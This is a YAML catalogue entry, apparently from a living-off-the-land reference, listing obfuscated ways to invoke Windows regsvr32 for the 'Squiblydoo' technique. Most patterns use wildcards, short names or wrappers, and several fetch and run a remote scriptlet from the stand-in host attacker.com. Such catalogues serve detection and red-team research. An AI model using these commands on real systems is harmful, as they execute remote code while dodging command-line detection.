---
Name: regsvr32
Description: "Registers and unregisters OLE controls. Can execute remote scriptlets (scrobj.dll) — the 'Squiblydoo' technique."
Platform: windows-cmd
BinaryPath:
  - C:\Windows\System32\regsvr32.exe
  - C:\Windows\SysWOW64\regsvr32.exe
Category: execution
MitreID: T1218.010
Patterns:
  - Pattern: "for /f %i in ('where regsvr3?.exe') do %i"
    Wildcards: ["?"]
    Notes: "Wildcard replaces '2'"
  - Pattern: "for /f %i in ('where r*svr32.exe') do %i"
    Wildcards: ["*"]
    Notes: "Star replaces 'eg'"
  - Pattern: "for /f %i in ('where regsvr*.exe') do %i"
    Wildcards: ["*"]
    Notes: "Star matches '32'"
  - Pattern: "for /f %i in ('dir /b C:\\Windows\\System32\\regsvr*.exe') do %i"
    Wildcards: ["*"]
    Notes: "dir glob search"
  - Pattern: "for %i in (C:\\Windows\\System32\\regsvr*.exe) do @%i /s /n /u /i:http://attacker.com/payload.sct scrobj.dll"
    Wildcards: ["*"]
    Notes: "Native CMD for loop with filesystem glob — expands regsvr*.exe directly in System32 without where.exe"
    Method: "Simple for glob"
  - Pattern: "for /f %i in ('where /r C:\\Windows regsvr*.exe') do %i /s /n /u /i:http://attacker.com/payload.sct scrobj.dll"
    Wildcards: ["*"]
    Notes: "Recursive where search across Windows tree — finds regsvr32.exe in System32 and SysWOW64"
    Method: "where /r recursive"
  - Pattern: "forfiles /p C:\\Windows\\System32 /m regsvr*.exe /c \"@file /s /n /u /i:http://attacker.com/payload.sct scrobj.dll\""
    Wildcards: ["*"]
    Notes: "forfiles * mask finds regsvr32.exe — @file expands to matched filename for Squiblydoo execution"
  - Pattern: "C:\\Windows\\System32\\REGSVR~1.EXE /s /n /u /i:http://attacker.com/payload.sct scrobj.dll"
    Wildcards: []
    Notes: "8.3 SFN — REGSVR~1 auto-generated for regsvr32.exe; requires NtfsDisable8dot3NameCreation=0"
  - Pattern: "cmd /c for /f %i in ('where regsvr*.exe') do %i /s /n /u /i:http://attacker.com/payload.sct scrobj.dll"
    Wildcards: ["*"]
    Notes: "cmd /c wrapper adds an extra process layer — glob resolves via where; parent process becomes cmd.exe not the caller"
    Method: "cmd /c indirection"
Resources:
  - https://attack.mitre.org/techniques/T1218/010/
  - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
---
